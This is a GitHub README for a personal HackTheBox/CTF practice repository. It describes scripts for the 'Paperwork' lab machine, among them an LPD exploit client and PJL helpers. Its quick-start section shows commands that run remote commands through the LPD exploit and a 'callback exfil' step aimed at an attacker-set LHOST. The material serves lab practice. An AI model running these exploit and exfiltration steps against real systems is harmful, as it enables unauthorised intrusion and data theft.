# ctf-toolkit

Lab scripts and small PoCs from **HackTheBox / CTF** practice.  
Maintained by [**DonMorpheus**](https://github.com/DonMorpheus).

> Educational use only. Run against systems you are allowed to test (HTB VPN, own VMs).  
> No flags, VPN configs, or live credentials in this repo.

## What's inside

| Path | Description |
|------|-------------|
| [`htb/Paperwork/paperwork/`](htb/Paperwork/paperwork/) | **Paperwork** (Easy) — LPD client, PJL helpers, `mgmt.sock` leak |
| [`profile/`](profile/) | Template for GitHub profile README (`DonMorpheus/DonMorpheus`) |

## Quick start

```bash
git clone https://github.com/DonMorpheus/ctf-toolkit.git
cd ctf-toolkit/htb/Paperwork/paperwork
# LPD foothold (set target IP)
python3 lpd_exploit.py <TARGET_IP> -c 'id'
# Callback exfil (optional): export LHOST=<your_tun0_ip>
export LHOST=10.10.x.x
./lpd_post.sh <TARGET_IP> tag 'id'
```

## Stack you'll see here

- Python 3 — custom protocol clients (LPD, PJL)
- Bash — enum / fuzz helpers on target via LPD one-liners
- Linux — Unix sockets, `recvmsg` / SCM_RIGHTS patterns

## Repo layout (for recruiters / HR)

```
ctf-toolkit/
├── README.md
├── LICENSE
├── htb/
│   └── Paperwork/     # HTB box name
│       └── paperwork/ # scripts for that machine
└── profile/           # optional GitHub landing page
```

More machines → add `htb/<BoxName>/<scripts>/` the same way.

## License

[MIT](LICENSE)